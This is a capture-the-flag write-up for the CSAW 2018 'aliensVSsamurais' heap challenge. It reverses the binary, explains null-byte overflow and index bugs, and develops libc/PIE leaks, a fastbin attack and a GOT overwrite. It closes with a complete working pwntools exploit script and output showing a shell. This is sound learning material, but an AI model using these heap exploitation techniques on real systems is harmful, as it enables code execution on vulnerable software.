# Csaw 2018 AlienVSSamurai

Let's take a look at the binary and libc:

```
$    ./libc-2.23.so
GNU C Library (Ubuntu GLIBC 2.23-0ubuntu11) stable release version 2.23, by Roland McGrath et al.
Copyright (C) 2016 Free Software Foundation, Inc.
This is free software; see the source for copying conditions.
There is NO warranty; not even for MERCHANTABILITY or FITNESS FOR A
PARTICULAR PURPOSE.
Compiled by GNU CC version 5.4.0 20160609.
Available extensions:
    crypt add-on version 2.1 by Michael Glad and others
    GNU Libidn by Simon Josefsson
    Native POSIX Threads Library by Ulrich Drepper et al
    BIND-8.2.3-T5B
libc ABIs: UNIQUE IFUNC
For bug reporting instructions, please see:
<https://bugs.launchpad.net/ubuntu/+source/glibc/+bugs>.
$    file aliensVSsamurais
aliensVSsamurais: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/l, for GNU/Linux 2.6.32, BuildID[sha1]=226c2e3531a2eb42de6f75a31e307146d23f990e, not stripped
$    pwn checksec aliensVSsamurais
[*] '/Hackery/pod/modules/custom_misc_heap/csaw18_alienVSsamurai/aliensVSsamurais'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
$    ./aliensVSsamurais
Daimyo, nani o shitaidesu ka?
3
Brood mother, what tasks do we have today.
4
Aliens have taken over the world.....
```

So we are dealing with a `64` bit binary, with the `libc-2.23.so` libc. The binary has a Stack Canary, NX, and PIE (but no relro). When we run the binary we are first prompted with a samurai menu, then an alien menu, and then aliens take over the world.

## Reversing

When we take a look at the main function, we see this:

```
undefined8 main(void)

{
  dojo();
  saved_malloc_hook = __malloc_hook;
  saved_free_hook = __free_hook;
  hatchery();
  invasion();
  return 0;
}
```

So we can see it calls three functions, `dojo`, `hatchery`, and `invasion`. After it calls `dojo`, it saves the hooks for malloc and free (which will cause us problems later). Looking at `dojo`, we see that it is a menue with three options.

```
void dojo(void)

{
  ulong task;
  long in_FS_OFFSET;
  char taskInput [24];
  long canary;
 
  canary = *(long *)(in_FS_OFFSET + 0x28);
  while( true ) {
    while( true ) {
      puts("Daimyo, nani o shitaidesu ka?");
      fgets(taskInput,0x18,stdin);
      task = strtoul(taskInput,(char **)0x0,0);
      if (task != 2) break;
      seppuku();
    }
    if (task == 3) break;
    if (task == 1) {
      new_samurai();
    }
  }
  if (canary == *(long *)(in_FS_OFFSET + 0x28)) {
    return;
  }
                    /* WARNING: Subroutine does not return */
  __stack_chk_fail();
}
```

We see that option `1` will allow us to allocate a new samurai (essentially allocating a chunk), option `2` will allow us to kill a samurai (essentially freeing the chunk), and option `3` is to move on to the next menu. I didn't find any bugs in these sub functions, or really anything too interesting (plus aliens are cooler, you can guess who I played in Alien VS Predator). So next up we have `hatchery`:

```
void hatchery(void)

{
  ulong task;
  long in_FS_OFFSET;
  char taskInput [24];
  long canary;
 
  canary = *(long *)(in_FS_OFFSET + 0x28);
  do {
    while( true ) {
      while( true ) {
        while( true ) {
          puts("Brood mother, what tasks do we have today.");
          fgets(taskInput,0x18,stdin);
          task = strtoul(taskInput,(char **)0x0,0);
          if (task != 2) break;
          consume_alien();
        }
        if (2 < task) break;
        if (task == 1) {
          new_alien();
        }
      }
      if (task != 3) break;
      rename_alien();
    }
  } while (task != 4);
  if (canary == *(long *)(in_FS_OFFSET + 0x28)) {
    return;
  }
                    /* WARNING: Subroutine does not return */
  __stack_chk_fail();
}
```

So with this menu, we can make aliens (`1`), kill aliens (`2`), and rename aliens (`3`). Looking at `new_alien` we see this:

```
void new_alien(void)

{
  ulong nameSize;
  void **alienPtr;
  void *namePtr;
  ssize_t bytesRead;
  long in_FS_OFFSET;
  char nameSizeInput [24];
  long canary;
  long canaryValue;
  long index;
 
  canaryValue = *(long *)(in_FS_OFFSET + 0x28);
  if (alien_index < 200) {
    if (__malloc_hook == saved_malloc_hook) {
      puts("How long is my name?");
      fgets(nameSizeInput,0x18,stdin);
      nameSize = strtoul(nameSizeInput,(char **)0x0,0);
      if (nameSize < 8) {
        puts("Too short!");
      }
      else {
        alienPtr = (void **)malloc(0x10);
        alienPtr[1] = (void *)0x100;
        namePtr = malloc(nameSize);
        *alienPtr = namePtr;
        puts("What is my name?");
        bytesRead = read(0,*alienPtr,nameSize);
        *(undefined *)((long)(int)bytesRead + (long)*alienPtr) = 0;
        index = alien_index * 8;
        alien_index = alien_index + 1;
        *(void ***)(aliens + index) = alienPtr;
      }
    }
    else {
      puts("WHOOOOOOOOOAAAAA");
    }
  }
  else {
    puts("Our mothership is too full!\n We require more overlords.");
  }
  if (canaryValue != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return;
}
```

So we can see how the aliens are made. We can specify the size and content for the name of the alien, but it has to be greater than or equal to `8`. We can see that our aliens are kept in the bss array `aliens` stored at offset `0x3020c0`. We can also see that it keeps track of how many aliens there are with the bss variable `alien_index` at offset `0x3020b0`. We see that the limit on the amount of aliens we can make is `200`. Also before malloc is called, it checks to see if the malloc hook has changed. Since `malloc` is only ever called here and in the samurai menu, unless if we can change the value of `saved_malloc_hook`, attacking the malloc hook isn't feasible. Also we can see the structure of an alien:

```
0x0:    ptr to alien name (chunks size and content we control)
0x8:    0x100 (for how we do things, doesn't really matter too much)
```

Also we can see that there is a null byte overflow bug with how it does it's null termination:
```
        bytesRead = read(0,*alienPtr,nameSize);
        *(undefined *)((long)(int)bytesRead + (long)*alienPtr) = 0;
```

Next up we have:

```
void consume_alien(void)

{
  ulong index;
  long in_FS_OFFSET;
  char indexInput [24];
  long canary;
 
  canary = *(long *)(in_FS_OFFSET + 0x28);
  puts("Which alien is unsatisfactory, brood mother?");
  fgets(indexInput,0x18,stdin);
  index = strtoul(indexInput,(char **)0x0,0);
  if (alien_index < index) {
    puts("That alien is too far away >(");
  }
  else {
    if (__free_hook == saved_free_hook) {
      kill_alien(index);
    }
    else {
      puts("Whooooaaaaaaaa");
    }
  }
  if (canary != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return;
}
```

So it checks to see if `index` is less than the index we provide as a validation (however this check isn't enough by itself). If we pass the check (and if the hook for free has not been changed) it will run `kill_alien`:

```
void kill_alien(long alien)

{
  puts("EEEEEAAAAUGGHGGHGHGAAAAa");
  free(**(void ***)(aliens + alien * 8));
  free(*(void **)(aliens + alien * 8));
  *(undefined8 *)(aliens + alien * 8) = 0;
  return;
}
```

So we can see it frees both pointers associated with the alien, and zeroes out the pointer in the aliens array. Finally we have `rename_alien`:

```
void rename_alien(void)

{
  long lVar1;
  ulong index;
  ssize_t bytesRead;
  long in_FS_OFFSET;
  char indexInput [24];
 
  lVar1 = *(long *)(in_FS_OFFSET + 0x28);
  puts("Brood mother, which one of my babies would you like to rename?");
  fgets(indexInput,0x18,stdin);
  index = strtoul(indexInput,(char **)0x0,0);
  printf("Oh great what would you like to rename %s to?\n",**(undefined8 **)(aliens + index * 8));
  bytesRead = read(0,**(void ***)(aliens + index * 8),8);
  *(undefined *)(bytesRead + **(long **)(aliens + index * 8)) = 0;
  if (lVar1 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return;
}
```

So we can see that it prompts us for an index to `aliens`, then prints the contents of it using `printf` with the `%s` flag. After that it allows us to scan in `0x8` bytes with `read`. After that it has the same null byte overflow bug that `new_alien` had. However we can see that it doesn't check the index that we pass, so we have an index bug too.

For `invasion` we can see that it checks the aliens / samurai that you have, and depending on the outcome, it will either run `win` or `loose`. For my exploit, I didn't really hit this code path so none of it is really relevant:

```
void invasion(void)

{
  ulong i;
 
  if (alien_index == 0) {
    lose();
  }
  i = 0;
  while (i < alien_index) {
    if (*(long *)(aliens + i * 8) != 0) {
      if (*(long *)(samurais + i * 8) == 0) {
        printf("No %d fighters? no problem\n",i);
        lose();
      }
      if (*(ulong *)(*(long *)(aliens + i * 8) + 8) < *(ulong *)(*(long *)(samurais + i * 8) + 8)) {
        win();
      }
    }
    i = i + 1;
  }
  lose();
  return;
}
```

## Exploitation

So we have two null byte overflows, and an index bug. The plan is to leverage these bugs to first get a libc and pie infoleak. Proceeding that we will use a fastbin attack to allocate a chunk a little before the `aliens` array. After that we will use the index bug to do a got overwrite over `puts` with a oneshot gadget.

However before that, things that affected this exploit. First off there was one malloc check that caused some issues with the fast bin attack:

```
      if (victim != 0)
        {
          if (__builtin_expect (fastbin_index (chunksize (victim)) != idx, 0))
            {
              errstr = "malloc(): memory corruption (fast)";
            errout:
              malloc_printerr (check_action, errstr, chunk2mem (victim), av);
              return NULL;
            }
          check_remalloced_chunk (av, victim, nb);
          void *p = chunk2mem (victim);
          alloc_perturb (p, bytes);
          return p;
        }
    }
```

The `malloc(): memory corruption (fast)` check requires the size of our fast bin chunk to correspond with the `idx` it is being allocated from. So if it is in idx `6`, the sizes have to fit into the range for that `idx`. One strategy to pass this check is to position your fake fast bin chunk in such a way that it reads the top byte of a previous value as the size. For instance let's say we wanted to allocate a chunk at `0x55c8a58620a0`

```
gef➤  x/4g 0x55c8a5862088
0x55c8a5862088: 0x0 0x7fb43c93b8e0
0x55c8a5862098: 0x0 0x0
```

We would try to allocate a chunk at `0x55c8a586209d`, that way we get alignment for our size to be `0x7f`:

```
gef➤  x/4g 0x55c8a586208d
0x55c8a586208d: 0xb43c93b8e0000000  0x7f
0x55c8a586209d: 0x0 0x0
```

Which would correspond to a valid size for this check for this idx it is in (`5`):

```
gef➤  heap bins
[+] No Tcache in this version of libc
────────────────────── Fastbins for arena 0x7fb43c93bb20 ──────────────────────
Fastbins[idx=0, size=0x10]  ←  Chunk(addr=0x55c8a6845770, size=0x20, flags=PREV_INUSE)
Fastbins[idx=1, size=0x20]  ←  Chunk(addr=0x55c8a6845540, size=0x30, flags=PREV_INUSE)  ←  Chunk(addr=0x55c8a68454f0, size=0x30, flags=PREV_INUSE)  ←  Chunk(addr=0x55c8a68454a0, size=0x30, flags=PREV_INUSE)  ←  Chunk(addr=0x55c8a6845450, size=0x30, flags=PREV_INUSE)
Fastbins[idx=2, size=0x30] 0x00
Fastbins[idx=3, size=0x40] 0x00
Fastbins[idx=4, size=0x50] 0x00
Fastbins[idx=5, size=0x60]  ←  Chunk(addr=0x55c8a586209d, size=0x78, flags=PREV_INUSE|IS_MMAPPED|NON_MAIN_ARENA)
Fastbins[idx=6, size=0x70] 0x00
─────────────────── Unsorted Bin for arena '*0x7fb43c93bb20' ───────────────────
[+] Found 0 chunks in unsorted bin.
──────────────────── Small Bins for arena '*0x7fb43c93bb20' ────────────────────
[+] small_bins[4]: fw=0x55c8a6845780, bk=0x55c8a6845780
 →   Chunk(addr=0x55c8a6845790, size=0x50, flags=PREV_INUSE)
[+] Found 1 chunks in 1 small non-empty bins.
──────────────────── Large Bins for arena '*0x7fb43c93bb20' ────────────────────
```

Also note, doing it this way would greatly limit where we can allocate a fake chunk. I know I tried to allocate a fake chunk to the free hook, since there is a free later on where it doesn't check the hook. There I could set up a chunk with a size value of `0x7f`, however `fgets` would change the size value prior to the malloc call, so that wasn't feasible.

Also after I found out why I couldn't do a fast bin attack against the free hook, I decided not to attack any of the hooks (`malloc/free/memalign/realloc`). In order to bypass the hook checks, we would have to do a write against PIE (with an infoleak) in addition to a libc write and infoleak, and at that point it would be simpler to do a got overwrite (since there is no PIE).

And one last thing, all of the infoleaks for my exploit came from the `printf` call in `rename_alien` (which expects a ptr to a ptr). Since it uses a `%s` flag, and all of our content for either new or renamed aliens is null terminated, we can't overflow content until we reach an address to get an infoleak.

#### Libc / PIE Infoleaks

For the libc infoleak, due to the version of libc it is we can leak arena pointers in the typical way via heap consolidation so the heap things it begins at the start of an allocated chunk. However before we start doing that, we need to deal with an alignment issue. This is because whenever we make a new alien, the code will allocate an `0x10` size chunk. To deal with this so we can align the chunks we want for the attack, I just allocated and freed four aliens was a chunk size of `0x20` (because the rounded up malloc size of a `0x10` chunk is `0x20`). After that I didn't have any alignment issues:

```
0x20: 0
0x20: 1
0x20: 2
0x20: 3
```

We start off the libc infoleak with these chunks:

```
0xf0: 4
0x60: 5
0xf0: 6
0x10: 7
```

then we free chunks `4` and `5`:

```
0xf0: 4 (freed)
0x60: 5 (freed)
0xf0: 6
0x10: 7
```

Then we allocate an `0x68` byte chunk, which will go where the old chunk `5` used to. We will overflow the size for chunk `6` with a null byte, which will set the previous in use bit to zero, so malloc thinks the previous chunk ahs been freed (which it hasn't). We will also set the previous size equal to `0x170` so it thinks the previous chunk started where the old chunk `4` was:

```
0xf0: 4 (freed)
0x68: 8
0xf0: 6 previous size 0x170, previous in use bit set to 0x0
0x10: 7
```

After that we will free chunk `6`, which will cause it to consolidate with the old chunk `4` (adding it to the unsorted bin), essentially causing the heap to forget about chunk `8`:

```
0xf0: 4 (freed, and heap consolidated here, start of unsorted bin)
0x68: 8 (forgotten about)
0xf0: 6 (freed)
0x10: 7
```

Now we will allocate an `0xf0` size chunk, which will come from the unsorted bin. This will move the beginning unsorted bin up to overlap with chunk `8`. Since the beginning of the unsorted bin has a libc arena pointer, we can just edit the alien at the address, and we will get a libc infoleak. Also whenever I got an infoleak, I just wrote over the value with itself, so I didn't actually change anything.

```
0xf0: 9
0x68: 8 (forgotten about, start of unsorted bin)
0xf0: 6 (freed)
0x10: 7
```

As for the pie infoleak, when we look at the memory around `aliens` and the got table, we see something interesting:

```
gef➤  telescope 0x56545ff99ff0 40
0x000056545ff99ff0│+0x0000: 0x0000000000000000
0x000056545ff99ff8│+0x0008: 0x00007f36fc8cc2d0  →  <__cxa_finalize+0> push r15
0x000056545ff9a000│+0x0010: 0x0000000000201df8
0x000056545ff9a008│+0x0018: 0x00007f36fce83168  →  0x000056545fd98000  →   jg 0x56545fd98047
0x000056545ff9a010│+0x0020: 0x00007f36fcc73ee0  →  <_dl_runtime_resolve_xsavec+0> push rbx
0x000056545ff9a018│+0x0028: 0x00007f36fc9164f0  →  <free+0> push r13
0x000056545ff9a020│+0x0030: 0x00007f36fc901690  →  <puts+0> push r12
0x000056545ff9a028│+0x0038: 0x000056545fd988c6  →   push 0x2
0x000056545ff9a030│+0x0040: 0x00007f36fc8e7800  →  <printf+0> sub rsp, 0xd8
0x000056545ff9a038│+0x0048: 0x00007f36fc989250  →  <read+0> cmp DWORD PTR [rip+0x2d24e9], 0x0        # 0x7f36fcc5b740
0x000056545ff9a040│+0x0050: 0x00007f36fc8b2740  →  <__libc_start_main+0> push r14
0x000056545ff9a048│+0x0058: 0x00007f36fc8ffad0  →  <fgets+0> test esi, esi
0x000056545ff9a050│+0x0060: 0x00007f36fc916130  →  <malloc+0> push rbp
0x000056545ff9a058│+0x0068: 0x00007f36fc8cd3f0  →  <strtouq+0> mov rax, QWORD PTR [rip+0x3889e1]        # 0x7f36fcc55dd8
0x000056545ff9a060│+0x0070: 0x000056545fd98936  →  0xff50e90000000968 ("h"?)
0x000056545ff9a068│+0x0078: 0x0000000000000000
0x000056545ff9a070│+0x0080: 0x000056545ff9a070  →  [loop detected]
0x000056545ff9a078│+0x0088: 0x0000000000000000
0x000056545ff9a080│+0x0090: 0x0000000000000000
0x000056545ff9a088│+0x0098: 0x0000000000000000
0x000056545ff9a090│+0x00a0: 0x00007f36fcc568e0  →  0x00000000fbad2088
0x000056545ff9a098│+0x00a8: 0x0000000000000000
0x000056545ff9a0a0│+0x00b0: 0x0000000000000000
0x000056545ff9a0a8│+0x00b8: 0x0000000000000000
0x000056545ff9a0b0│+0x00c0: 0x000000000000000a
0x000056545ff9a0b8│+0x00c8: 0x0000000000000000
0x000056545ff9a0c0│+0x00d0: 0x0000000000000000
0x000056545ff9a0c8│+0x00d8: 0x0000000000000000
0x000056545ff9a0d0│+0x00e0: 0x0000000000000000
0x000056545ff9a0d8│+0x00e8: 0x0000000000000000
0x000056545ff9a0e0│+0x00f0: 0x0000000000000000
0x000056545ff9a0e8│+0x00f8: 0x0000000000000000
0x000056545ff9a0f0│+0x0100: 0x0000000000000000
0x000056545ff9a0f8│+0x0108: 0x0000565461bab430  →  0x0000565461bab7e0  →  "33333333"
0x000056545ff9a100│+0x0110: 0x0000565461bab4d0  →  0x0000565461bab670  →  0x00007f36fcc56b78  →  0x0000565461bab7f0  →  0x0000000000000000
0x000056545ff9a108│+0x0118: 0x0000565461bab480  →  0x0000565461bab570  →  "44444444"
0x000056545ff9a110│+0x0120: 0x0000000000000000
0x000056545ff9a118│+0x0128: 0x0000000000000000
0x000056545ff9a120│+0x0130: 0x0000000000000000
0x000056545ff9a128│+0x0138: 0x0000000000000000
```

We can see at `0x000056545ff9a070`, is a ptr that points to itself. So it is an infinite ptr. Thing is, with our infoleak, we need a ptr, to a ptr, to whatever thing we want to leak. This right here is really useful, since no matter how many times you dereference it, it will still give you a PIE address. So we can leak this to break PIE. Also the purpose of this infinite pointer is to point to the got table, which is used in `dl_resolve`.

With that, we have our PIE/libc infoleaks.

#### Fast Bin Attack

So the libc infoleak left us off at a pretty good spot for the fast bin attack, since the unsorted bin overlaps with an allocated chunk. With how we have groomed the heap, we can just allocate an `0x60` byte chunk, which will come from the unsorted bin and overlap directly with our chunk `8`:

```
0xf0:       9
0x68/0x60:  8 & 10 (2 overlapping chunks)
0xf0:       6 (freed)
0x10:       7
```

Now we can free chunk `10`, which will insert it into the fast bin. Then leveraging chunk `8` and `rename_alien`, we can overwrite the next pointer of that chunk in the fast bin.

Before the write:

```
gef➤  heap bins
[+] No Tcache in this version of libc
────────────────────── Fastbins for arena 0x7fbdc9a1ab20 ──────────────────────
Fastbins[idx=0, size=0x10]  ←  Chunk(addr=0x5560138db520, size=0x20, flags=PREV_INUSE)
Fastbins[idx=1, size=0x20]  ←  Chunk(addr=0x5560138db540, size=0x30, flags=PREV_INUSE)  ←  Chunk(addr=0x5560138db4f0, size=0x30, flags=PREV_INUSE)  ←  Chunk(addr=0x5560138db4a0, size=0x30, flags=PREV_INUSE)  ←  Chunk(addr=0x5560138db450, size=0x30, flags=PREV_INUSE)
Fastbins[idx=2, size=0x30] 0x00
Fastbins[idx=3, size=0x40] 0x00
Fastbins[idx=4, size=0x50] 0x00
Fastbins[idx=5, size=0x60]  ←  Chunk(addr=0x5560138db670, size=0x70, flags=PREV_INUSE)
Fastbins[idx=6, size=0x70] 0x00
─────────────────── Unsorted Bin for arena '*0x7fbdc9a1ab20' ───────────────────
[+] unsorted_bins[0]: fw=0x5560138db6d0, bk=0x5560138db6d0
 →   Chunk(addr=0x5560138db6e0, size=0x100, flags=PREV_INUSE)
[+] Found 1 chunks in unsorted bin.
──────────────────── Small Bins for arena '*0x7fbdc9a1ab20' ────────────────────
[+] Found 0 chunks in 0 small non-empty bins.
──────────────────── Large Bins for arena '*0x7fbdc9a1ab20' ────────────────────
[+] Found 0 chunks in 0 large non-empty bins.
```

After the write:
```
gef➤  heap bins
[+] No Tcache in this version of libc
────────────────────── Fastbins for arena 0x7fbdc9a1ab20 ──────────────────────
Fastbins[idx=0, size=0x10]  ←  Chunk(addr=0x5560138db520, size=0x20, flags=PREV_INUSE)
Fastbins[idx=1, size=0x20]  ←  Chunk(addr=0x5560138db540, size=0x30, flags=PREV_INUSE)  ←  Chunk(addr=0x5560138db4f0, size=0x30, flags=PREV_INUSE)  ←  Chunk(addr=0x5560138db4a0, size=0x30, flags=PREV_INUSE)  ←  Chunk(addr=0x5560138db450, size=0x30, flags=PREV_INUSE)
Fastbins[idx=2, size=0x30] 0x00
Fastbins[idx=3, size=0x40] 0x00
Fastbins[idx=4, size=0x50] 0x00
Fastbins[idx=5, size=0x60]  ←  Chunk(addr=0x5560138db670, size=0x70, flags=PREV_INUSE)  ←  Chunk(addr=0x5560129ef09d, size=0x78, flags=PREV_INUSE|IS_MMAPPED|NON_MAIN_ARENA)
Fastbins[idx=6, size=0x70] 0x00
─────────────────── Unsorted Bin for arena '*0x7fbdc9a1ab20' ───────────────────
[+] unsorted_bins[0]: fw=0x5560138db6d0, bk=0x5560138db6d0
 →   Chunk(addr=0x5560138db6e0, size=0x100, flags=PREV_INUSE)
[+] Found 1 chunks in unsorted bin.
──────────────────── Small Bins for arena '*0x7fbdc9a1ab20' ────────────────────
[+] Found 0 chunks in 0 small non-empty bins.
──────────────────── Large Bins for arena '*0x7fbdc9a1ab20' ────────────────────
[+] Found 0 chunks in 0 large non-empty bins.
```

Now let's take a close look at where I decided to make this fake chunk:

```
gef➤  x/20g 0x5560129ef088
0x5560129ef088: 0x0 0x7fbdc9a1a8e0
0x5560129ef098: 0x0 0x0
0x5560129ef0a8: 0x0 0xb
0x5560129ef0b8: 0x0 0x0
0x5560129ef0c8: 0x0 0x0
0x5560129ef0d8: 0x0 0x0
0x5560129ef0e8: 0x0 0x0
0x5560129ef0f8: 0x5560138db430  0x5560138db4d0
0x5560129ef108: 0x5560138db480  0x0
0x5560129ef118: 0x0 0x0
gef➤  x/20g 0x5560129ef08d
0x5560129ef08d: 0xbdc9a1a8e0000000  0x7f
0x5560129ef09d: 0x0 0x0
0x5560129ef0ad: 0xb000000 0x0
0x5560129ef0bd: 0x0 0x0
0x5560129ef0cd: 0x0 0x0
0x5560129ef0dd: 0x0 0x0
0x5560129ef0ed: 0x0 0x60138db430000000
0x5560129ef0fd: 0x60138db4d0000055  0x60138db480000055
0x5560129ef10d: 0x55  0x0
0x5560129ef11d: 0x0 0x0
```

We can see that our fake chunk will be near the start of aliens, and then with our alignment the size will be `0x7f` so it will pass that malloc check. We see that our fake chunk is near the start of `aliens`. We will write two pointers to our fake chunk (let's go with ptrs `x` and `y`). Ptr `x` will just point to ptr `y`, and ptr `y` will point to the got address for `puts`. That way we can just pass an index to `rename_alien` that will make it rename ptr `x` as if it were an alien, and that will give us a got table overwrite. Also I choose `puts` since it is the next function called after the got write.

Here we can see the memory corruption play out. I needed to restart the exploit, and because of aslr, the addresses changed:

```
gef➤  x/20g 0x563912451088
0x563912451088: 0x0 0x7fc5ac1ba8e0
0x563912451098: 0x0 0x0
0x5639124510a8: 0x0 0xc
0x5639124510b8: 0x0 0x0
0x5639124510c8: 0x0 0x0
0x5639124510d8: 0x0 0x0
0x5639124510e8: 0x0 0x0
0x5639124510f8: 0x563913eee430  0x563913eee4d0
0x563912451108: 0x563913eee480  0x0
0x563912451118: 0x563913eee520  0x0
```

Then we allocate our fake fast bin chunk and write the pointers:

```
gef➤  x/20g 0x563912451088
0x563912451088: 0x0 0x7fc5ac1ba8e0
0x563912451098: 0x3935310000000000  0x5639124510a8
0x5639124510a8: 0x563912451020  0xd
0x5639124510b8: 0x0 0x0
0x5639124510c8: 0x0 0x0
0x5639124510d8: 0x0 0x0
0x5639124510e8: 0x0 0x0
0x5639124510f8: 0x563913eee430  0x563913eee4d0
0x563912451108: 0x563913eee480  0x0
0x563912451118: 0x563913eee520  0x563913eee6e0
gef➤  x/g 0x563912451020
0x563912451020: 0x00007fc5abe65690
gef➤  x/i 0x00007fc5abe65690
   0x7fc5abe65690 <puts>: push   r12
```

Then we do our got overwrite, and we get a shell!

## Exploit

Putting it all together, we get the following exploit:

```
from pwn import *

target = process("./aliensVSsamurais", env={"LD_PRELOAD":"./libc-2.23.so"})
#gdb.attach(target)

elf = ELF('aliensVSsamurais')
libc = ELF('libc-2.23.so')

def goToHatchery():
  target.sendline("3")

def makeAlien(size, content, newline=None):
  print target.recvuntil("Brood mother, what tasks do we have today.")
  target.sendline("1")
  print target.recvuntil("How long is my name?")
  target.sendline(str(size))
  print target.recvuntil("What is my name?")
  if newline == None:
    target.sendline(content)
  else:
    target.send(content)
def killAlien(index):
  print target.recvuntil("Brood mother, what tasks do we have today.")
  target.sendline("2")
  print target.recvuntil("Which alien is unsatisfactory, brood mother?")
  target.sendline(str(index))

def editAlien(index, content, leak = None):
  print target.recvuntil("Brood mother, what tasks do we have today.")
  target.sendline("3")
  print target.recvuntil("Brood mother, which one of my babies would you like to rename?")
  target.sendline(str(index))
  print target.recvuntil("Oh great what would you like to rename ")

  if leak != None:
    leak = target.recvline()
    leak = leak.replace(" to?\n", "")
    leak = u64(leak + "\x00"*(8-len(leak)))
    print "leak is: " + hex(leak)
    target.send(p64(leak)[:6])
  else:
    target.sendline(content)

  return leak


goToHatchery()



# Get that free bin edit / libc infoleak

# First groom the heap for alignment
makeAlien(0x20, 'pineapple')# 0
makeAlien(0x20, 'pineapple')# 1
makeAlien(0x20, 'pineapple')# 2
makeAlien(0x20, 'pineapple')# 3

killAlien(0)
killAlien(1)
killAlien(2)
killAlien(3)

makeAlien(0xf0, "0"*8)# 4
makeAlien(0x60, "1"*8)# 5
makeAlien(0xf0, "2"*8)# 6
makeAlien(0x10, "3"*8)# 7

killAlien(4)
killAlien(5)

# This chunk is the one that will overlap with the unsorted bin
makeAlien(0x68, "4"*0x60 + p64(0x170))# 8

killAlien(6)

makeAlien(0xf0, '4'*8)# 9

# Leak libc
leak = editAlien(8, "0000000", 1)
libcBase = leak - 0x3c4b78
freeHook = libcBase + libc.symbols['__malloc_hook'] - 0x13



# Leak pie
x = editAlien(-10, "0", 1)
pieBase = x - 0x202070

fakeChunk = pieBase + 0x20208d

print "Pie Base: " + hex(pieBase)
print "Libc Base: " + hex(libcBase)
print "Fake Chun: " + hex(fakeChunk)



# This chunk overlaps with chunk 8
makeAlien(0x60, '5'*8)# 10

# Add chunk 10 to the fast bin
killAlien(10)

# Edit fastbin chunk, add our fake chunk to the fast bin
editAlien(8, p64(fakeChunk))

# Move our fake chunk up to the top of the fast bin
makeAlien(0x60, '8'*8)# 13

# Write the pointers for the got overwrite
makeAlien(0x60, '159' + p64(fakeChunk + 3 + 0x18) + p64(pieBase + elf.got['puts'])[:6], 1)# 14



# Execute the got overwrite
editAlien(-4, p64(libcBase + 0x45216))

# Enjoy your shell!
target.interactive()
```

When we run the exploit:

```
$ python exploit.py
[+] Starting local process './aliensVSsamurais': pid 18692
[*] '/Hackery/pod/modules/custom_misc_heap/csaw18_alienVSsamurai/aliensVSsamurais'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[*] '/Hackery/pod/modules/custom_misc_heap/csaw18_alienVSsamurai/libc-2.23.so'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
Daimyo, nani o shitaidesu ka?
Brood mother, what tasks do we have today.

How long is my name?

What is my name?

Brood mother, what tasks do we have today.

How long is my name?

What is my name?

Brood mother, what tasks do we have today.

How long is my name?

What is my name?

Brood mother, what tasks do we have today.

How long is my name?

What is my name?

Brood mother, what tasks do we have today.

Which alien is unsatisfactory, brood mother?

EEEEEAAAAUGGHGGHGHGAAAAa
Brood mother, what tasks do we have today.

Which alien is unsatisfactory, brood mother?

EEEEEAAAAUGGHGGHGHGAAAAa
Brood mother, what tasks do we have today.

Which alien is unsatisfactory, brood mother?

EEEEEAAAAUGGHGGHGHGAAAAa
Brood mother, what tasks do we have today.

Which alien is unsatisfactory, brood mother?

EEEEEAAAAUGGHGGHGHGAAAAa
Brood mother, what tasks do we have today.

How long is my name?

What is my name?

Brood mother, what tasks do we have today.

How long is my name?

What is my name?

Brood mother, what tasks do we have today.

How long is my name?

What is my name?

Brood mother, what tasks do we have today.

How long is my name?

What is my name?

Brood mother, what tasks do we have today.

Which alien is unsatisfactory, brood mother?

EEEEEAAAAUGGHGGHGHGAAAAa
Brood mother, what tasks do we have today.

Which alien is unsatisfactory, brood mother?

EEEEEAAAAUGGHGGHGHGAAAAa
Brood mother, what tasks do we have today.

How long is my name?

What is my name?

Brood mother, what tasks do we have today.

Brood mother, what tasks do we have today.
Which alien is unsatisfactory, brood mother?

EEEEEAAAAUGGHGGHGHGAAAAa
Brood mother, what tasks do we have today.

How long is my name?

What is my name?

Brood mother, what tasks do we have today.

Brood mother, which one of my babies would you like to rename?

Oh great what would you like to rename
leak is: 0x7fb1d4fabb78
Brood mother, what tasks do we have today.

Brood mother, which one of my babies would you like to rename?

Oh great what would you like to rename
leak is: 0x560d211eb070
Pie Base: 0x560d20fe9000
Libc Base: 0x7fb1d4be7000
Fake Chun: 0x560d211eb08d
Brood mother, what tasks do we have today.

How long is my name?

What is my name?

Brood mother, what tasks do we have today.

Which alien is unsatisfactory, brood mother?

EEEEEAAAAUGGHGGHGHGAAAAa
Brood mother, what tasks do we have today.

Brood mother, which one of my babies would you like to rename?

Oh great what would you like to rename
 to?
Brood mother, what tasks do we have today.

Brood mother, what tasks do we have today.
How long is my name?

What is my name?

Brood mother, what tasks do we have today.

How long is my name?

What is my name?

Brood mother, what tasks do we have today.

Brood mother, which one of my babies would you like to rename?

Oh great what would you like to rename
[*] Switching to interactive mode
\x90f��\xb1\x7f to?
$ w
 20:04:44 up 16:22,  1 user,  load average: 0.06, 0.09, 0.09
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
guyinatu tty7     :0               Sat12   31:21m  6:50   0.47s /sbin/upstart --user
$ ls
aliensVSsamurais  core    exploit.py  libc-2.23.so  malloc.c  readme.md
```

Just like that, we popped a shell!